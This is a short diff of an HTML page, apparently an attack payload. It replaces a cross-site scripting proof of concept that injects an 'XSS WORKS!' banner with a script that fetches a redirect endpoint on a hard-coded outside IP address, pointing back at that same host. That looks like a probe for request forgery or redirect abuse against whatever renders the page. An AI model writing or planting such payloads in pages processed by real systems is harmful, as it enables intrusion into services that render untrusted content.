@@ -5,8 +5,8 @@
   </head>
   <body>
     <script>
-      document.body.style.background = "yellow";
-      document.body.innerHTML += "<h1 style='color:red;text-align:center;'>XSS WORKS!</h1>";
+      fetch('http://44.203.154.8/redir.php?url=http://44.203.154.8/redir.php')
+        .then(r => r.text())
     </script>
   </body>
 </html>
